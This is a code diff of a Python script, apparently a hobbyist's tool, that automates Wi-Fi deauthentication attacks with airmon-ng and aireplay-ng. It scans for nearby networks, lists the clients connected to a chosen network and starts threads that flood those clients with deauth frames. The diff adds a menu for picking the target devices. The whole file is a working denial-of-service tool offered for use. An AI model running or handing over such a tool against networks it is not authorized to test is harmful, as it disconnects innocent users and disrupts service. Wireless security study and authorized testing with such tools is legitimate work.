@@ -12,20 +12,20 @@ import time
 
 
 #######################################################################################################################
-#######################################################################################################################
+############################################## HELPER FUNCTIONS #######################################################
 
-# Helper functions
 def in_sudo_mode():
     """If the user doesn't run the program with super user privileges, don't allow them to continue."""
     
-    if not 'SUDO_UID' in os.environ.keys():
-        print("Try running this program with sudo.")
+    if os.geteuid() != 0:
+        print("\n=========================================================================\n")
+        print("\033[1;31mAccess denied, you neet ROOT permissions. Try running the program with sudo.\033[0m")
         exit()
 
 
 
 def find_nic():
-    """This function is used to find the network interface controllers on your computer."""
+    """This function is used to find the network interface adapters on your computer."""
     
     # We use the subprocess.run to run the "sudo iw dev" command we'd normally run to find the network interfaces. 
     result = subprocess.run(["iw", "dev"], capture_output=True).stdout.decode()
@@ -36,7 +36,7 @@ def find_nic():
 
 def set_monitor_mode(controller_name):
     """This function needs the network interface controller name to put it into monitor mode.
-    Argument: Network Controller Name"""
+    Argument: Network adapter Name"""
 
     subprocess.run(["ip", "link", "set", wifi_name, "down"])
     subprocess.run(["airmon-ng", "check", "kill"])
@@ -65,7 +65,7 @@ def backup_csv():
     
     for file_name in os.listdir():
         if ".csv" in file_name:
-            print("There shouldn't be any .csv files in your directory. We found .csv files in your directory.")
+            print("We found .csv files in your directory. Moving them to a Backup folder...")
 
             directory = os.getcwd()
             try:
@@ -75,6 +75,7 @@ def backup_csv():
 
             timestamp = datetime.now()
             shutil.move(file_name, directory + "/backup/" + str(timestamp) + "-" + file_name)
+            print("Done!\n\n")
 
 
 
@@ -116,28 +117,116 @@ def wifi_networks_menu():
                                 elif check_for_essid(row["ESSID"], active_wireless_networks):
                                     active_wireless_networks.append(row)
 
-            print("Scanning. Press Ctrl+C when you want to select which wireless network you want to attack.\n")
+            print("\033[1;32mScanning. Press Ctrl+C when you want to select which wireless network you want to attack.\033[0m\n")
+            print("===============================================================================================\n")
             print("No |\tBSSID              |\tChannel|\tESSID                         |")
             print("___|\t___________________|\t_______|\t______________________________|")
             
             for index, item in enumerate(active_wireless_networks):
-                print(f"{index}\t{item['BSSID']}\t{item['channel'].strip()}\t\t{item['ESSID']}")
+                print(f"\033[1;35m{index}\t{item['BSSID']}\t{item['channel'].strip()}\t\t{item['ESSID']}\033[0m")
 
             time.sleep(1)
 
     except KeyboardInterrupt:
-        print("\nReady to make choice.")
+        print("\n\n\033[32mReady to make choice!\033[0m")
+
     
     while True:
-        net_choice = input("Please select a choice from above: ")
-        if active_wireless_networks[int(net_choice)]:
-            return active_wireless_networks[int(net_choice)]
-        print("Please try again.")
+        try:
+            print("==================================================")
+            net_choice = input("Please select a network to target: ")
+            if active_wireless_networks[int(net_choice)]:
+                return active_wireless_networks[int(net_choice)]
+        
+        except KeyboardInterrupt:
+            shutdown()
+            break
+        
+        except:
+            print("\033[1;31mPlease try again.\033[0m")
+
+
+
+def clients_menu():
+    """ Loop that shows the clients connected to the choosen network. We use a try except block and we will quit the loop by pressing ctrl-c."""
+    
+    clients = set()
+    try:
+        while True:
+            subprocess.call("clear", shell=True)
+            for file_name in os.listdir():
+                fieldnames = ["Station MAC", "First time seen", "Last time seen", "Power", "packets", "BSSID", "Probed ESSIDs"]
+                
+                if ".csv" in file_name and file_name.startswith("clients"):
+                    with open(file_name) as csv_h:
+                        csv_h.seek(0)
+                        csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
+                        for row in csv_reader:
+                            if mac_address_regex.match(row["Station MAC"]) and row["Station MAC"] != hackbssid:
+                                clients.add(row["Station MAC"])
+
+
+            print("\033[1;32mScanning. Press Ctrl+C when you want to select which devices to attack.\033[0m\n")
+            print("=============================================================================\n")
+            print("No |\tDevices              |")
+            print("___|\t_____________________|")
+            
+            for index, item in enumerate(clients):
+                print(f"\033[1;35m{index}\t{item}\033[0m")
+
+            time.sleep(1)
+
+    except KeyboardInterrupt:
+        print("\n\n\033[32mReady to attack!\033[0m")
+    
+
+    # Menu to request Mac Addresses to be kick off the network.
+    while True:
+        print("======================================================================================================")
+        print("Please select the number of MAC Address(es) of the device(s) that you want to kick off the network.")
+        macs = input("Please use a comma separated if there are more than one, ie 0,1,... [Enter for selecting all]: ")
+        macs_to_kick_off = []
+
+        try:
+            list_of_clients = list(clients)
+            if macs == "":
+                break
+            
+            else:    
+                if len(macs) == 1:
+                    if list_of_clients[int(macs)]:
+                        macs_to_kick_off.append(list_of_clients[int(macs)])
+                        break
+                
+                else:
+                    choices = macs.split(",")
+                    macs_choices = [int(num) for num in choices]
+                    for i in macs_choices:#0,1
+                        if list_of_clients[i]:
+                            macs_to_kick_off.append(list_of_clients[i])
+                        if i == list_of_clients[-1]:
+                            break
+
+
+        except KeyboardInterrupt:
+            shutdown()
+            break
+        
+        except:
+            print("\033[1;31mPlease make a valid selection!\033[0m")
+
+
+    if len(macs_to_kick_off) > 0:
+        return macs_to_kick_off
+
+    elif len(macs_to_kick_off) == 0:
+        macs_to_kick_off = list(clients)
+        return macs_to_kick_off
 
 
 
 def set_into_managed_mode(wifi_name):
-    """SET YOUR NETWORK CONTROLLER INTERFACE INTO MANAGED MODE & RESTART NETWORK MANAGER
+    """SET YOUR NETWORK ADAPTER INTERFACE INTO MANAGED MODE & RESTART NETWORK MANAGER
        ARGUMENTS: wifi interface name 
     """
 
@@ -145,6 +234,18 @@ def set_into_managed_mode(wifi_name):
     subprocess.run(["iwconfig", wifi_name, "mode", "managed"])
     subprocess.run(["ip", "link", "set", wifi_name, "up"])
     subprocess.run(["service", "NetworkManager", "start"])
+
+
+
+def shutdown():
+    print("\n\n\033[1;31mStopping the attack!\033[0m")
+    print("\n\033[1mShutting down the program safely...\033[0m")
+    try:
+        set_into_managed_mode(wifi_name)
+    except:
+        pass
+    finally: 
+        print("\n\033[1;32mThank you for using this program!\033[0m")
 
 
 
@@ -157,8 +258,9 @@ def deauth_attack(network_mac, target_mac, interface):
     subprocess.Popen(["aireplay-ng", "--deauth", "0", "-a", network_mac, "-c", target_mac, interface])
 
 
+
 #######################################################################################################################
-#######################################################################################################################
+################################################## MAIN PROGRAM #######################################################
 
 
 # Regular Expressions to be used.
@@ -166,128 +268,105 @@ mac_address_regex = re.compile(r'(?:[0-9a-fA-F]:?){12}')
 wlan_code = re.compile("Interface (wlan[0-9]+)")
 
 
+# We want to clear the screen before we start the program.
+subprocess.call("clear", shell=True)
+
 # Program Header
 # Basic user interface header
-print(r"""
- ______  _  _                  _____         _  _                  _
-|  ____|| |(_)                |  _  \       | || |                | |
-| |____ | | _ __   __ __ _    | |_/ /  __ _ | || |  ___   _   _  _| |_
-|  ____|| || |\ \ / // _` |   |  _  \ / _` || || | / _ \ | | | ||_   _|
-| |____ | || | \ V /| (_| |   | |_/ /| (_| || || || (_) || |_| |  | |_
-|______||_||_|  / /  \__,_|   \____/  \__,_||_||_| \___/  \___/   |_ /
-               / /
-              /_/  
-""")
-print("\n****************************************************************")
-print("\n* Copyrights of Eliya Ballout, 2023                            *")
-print("\n* https://github.com/eliyaballout                              *")
-print("\n****************************************************************")
+print("\033[1;30;43m" + r"""
+ ______  _  _                  _____         _  _                  _     
+|  ____|| |(_)                |  _  \       | || |                | |    
+| |____ | | _ __   __ __ _    | |_/ /  __ _ | || |  ___   _   _  _| |_   
+|  ____|| || |\ \ / // _` |   |  _  \ / _` || || | / _ \ | | | ||_   _|  
+| |____ | || | \ V /| (_| |   | |_/ /| (_| || || || (_) || |_| |  | |_   
+|______||_||_|  / /  \__,_|   \____/  \__,_||_||_| \___/  \___/   |_ /   
+               / /                                                       
+              /_/                                                        
+                                                                         """ + "\033[0m")
 
-# In Sudo Mode?
-in_sudo_mode()
-# Move any csv files to current working directory/backup
-backup_csv()
-
-# Lists to be populated
-macs_not_to_kick_off = list()
+print("\n\033[1;31m**************************************************************************\033[0m")
+print("\n\033[1;36m*                   Copyrights of Eliya Ballout, 2023                    *\033[0m")
+print("\n\033[1;36m*                    https://github.com/eliyaballout                     *\033[0m")
+print("\n\033[1;31m**************************************************************************\033[0m")
+print("\n\n")
 
 
-# Menu to request Mac Addresses to be kept on network.
-while True:
-    print("Please enter the MAC Address(es) of the device(s) you don't want to kick off the network.")
-    macs = input("Please use a comma separated list if more than one, ie 00:11:22:33:44:55,11:22:33:44:55:66 :")
-    macs_not_to_kick_off = mac_address_regex.findall(macs)
-    macs_not_to_kick_off = [mac.upper() for mac in macs_not_to_kick_off]
 
-    if len(macs_not_to_kick_off) > 0:
-        break
-    
-    print("You didn't enter valid Mac Addresses.")
-
-
-# Menu to ask which bands to scan with airmon-ng
-while True:
-    wifi_controller_bands = ["bg (2.4Ghz)", "a (5Ghz)", "abg (Will be slower)"]
-    print("Please select the type of scan you want to run.")
-    for index, controller in enumerate(wifi_controller_bands):
-        print(f"{index} - {controller}")
-    
-
-    # Check if the choice exists. If it doesn't it asks the user to try again.
-    # We don't cast it to an integer at this stage as characters other than digits will cause the program to break.
-    band_choice = input("Please select the bands you want to scan from the list above: ")
-    try:
-        if wifi_controller_bands[int(band_choice)]:
-            band_choice = int(band_choice)
-            break
-    except:
-        print("Please make a valid selection.")
-
-
-# Find all the network interface controllers.
-network_controllers = find_nic()
-if len(network_controllers) == 0:
-    print("Please connect a network interface controller and try again!")
-    exit()
-
-
-# Select the network interface controller you want to put into monitor mode.
-while True:
-    for index, controller in enumerate(network_controllers):
-        print(f"{index} - {controller}")
-    
-    controller_choice = input("Please select the controller you want to put into monitor mode: ")
-
-    try:
-        if network_controllers[int(controller_choice)]:
-            break
-    except:
-        print("Please make a valid selection!")
-
-
-# Assign the network interface controller name to a variable for easy use.
-wifi_name = network_controllers[int(controller_choice)]
-
-set_monitor_mode(wifi_name)
-set_band_to_monitor(band_choice)
-wifi_network_choice = wifi_networks_menu()
-hackbssid = wifi_network_choice["BSSID"]
-hackchannel = wifi_network_choice["channel"].strip()
-get_clients(hackbssid, hackchannel, wifi_name)
-
-active_clients = set()
-threads_started = []
-
-# Make sure that airmon-ng is running on the correct channel.
-subprocess.run(["airmon-ng", "start", wifi_name, hackchannel])
 try:
-    while True:
-        count = 0
 
-        # We want to clear the screen before we print the network interfaces.
-        subprocess.call("clear", shell=True)
-        for file_name in os.listdir():
-            fieldnames = ["Station MAC", "First time seen", "Last time seen", "Power", "packets", "BSSID", "Probed ESSIDs"]
-            if ".csv" in file_name and file_name.startswith("clients"):
-                with open(file_name) as csv_h:
-                    print("Running")
-                    csv_h.seek(0)
-                    csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
-                    for index, row in enumerate(csv_reader):
-                        if index < 5:
-                            pass
-                        
-                        # We will not add the MAC Addresses we specified at the beginning of the program to the ones we will kick off.
-                        elif row["Station MAC"] in macs_not_to_kick_off:
-                            pass
-                        
-                        else:
-                            # Add all the active MAC Addresses.
-                            active_clients.add(row["Station MAC"])
-            
-            print("Station MAC           |")
-            print("______________________|")
-            for item in active_clients:
+    # In Sudo Mode?
+    in_sudo_mode()
+
+    # Move any csv files to current working directory/backup
+    backup_csv()
+
+    # Menu to ask which bands to scan with airmon-ng
+    while True:
+        print("===========================================================================")
+        wifi_controller_bands = ["bg (2.4Ghz)", "a (5Ghz)", "abg (Both, Will be slower)"]
+        print("Please select the type of scan you want to run.")
+        for index, controller in enumerate(wifi_controller_bands):
+            print(f"\033[1;33m{index} - {controller}\033[0m")
+        
+
+        # Check if the choice exists. If it doesn't it asks the user to try again.
+        # We don't cast it to an integer at this stage as characters other than digits will cause the program to break.
+        band_choice = input("Please select the bands you want to scan from the list above: ")
+        try:
+            if wifi_controller_bands[int(band_choice)]:
+                band_choice = int(band_choice)
+                break
+        
+        except:
+            print("\033[1;31mPlease make a valid selection!\033[0m")
+
+
+    # Find all the network interface controllers.
+    network_controllers = find_nic()
+    if len(network_controllers) == 0:
+        print("\033[1;31mPlease connect a network adapter and try again!\033[0m")
+        exit()
+
+
+    # Select the network interface controller you want to put into monitor mode.
+    while True:
+        print("\n\n===========================================================================")
+        for index, controller in enumerate(network_controllers):
+            print(f"\033[1;33m{index} - {controller}\033[0m")
+        
+        controller_choice = input("Please select the wireless adapter that you want to put into monitor mode: ")
+
+        try:
+            if network_controllers[int(controller_choice)]:
+                break
+        
+        except:
+            print("\033[1;31mPlease make a valid selection!\033[0m")
+
+
+    # Assign the network interface controller name to a variable for easy use.
+    wifi_name = network_controllers[int(controller_choice)]
+
+    set_monitor_mode(wifi_name)
+    set_band_to_monitor(band_choice)
+    wifi_network_choice = wifi_networks_menu()
+    hackbssid = wifi_network_choice["BSSID"]
+    hackchannel = wifi_network_choice["channel"].strip()
+    get_clients(hackbssid, hackchannel, wifi_name)
+    clients_to_kick_off = clients_menu()
+
+    threads_started = []
+
+    # Make sure that airmon-ng is running on the correct channel.
+    subprocess.run(["airmon-ng", "start", wifi_name, hackchannel])
+    try:
+        while True:
+
+            # We want to clear the screen before we print the network interfaces.
+            subprocess.call("clear", shell=True)
+            print("    Device MAC      |")
+            print("____________________|")
+            for item in clients_to_kick_off:
                 print(f"{item}")
                 if item not in threads_started:
                     threads_started.append(item)
@@ -295,9 +374,13 @@ try:
                     t = threading.Thread(target=deauth_attack, args=[hackbssid, item, wifi_name], daemon=True)
                     t.start()
 
+    except KeyboardInterrupt:
+        shutdown()
+
+
+
 except KeyboardInterrupt:
-    print("\nStopping Deauth")
+    shutdown()
 
-
-# Set the network interface controller back into managed mode and restart network services. 
-set_into_managed_mode(wifi_name)
+except:
+    pass
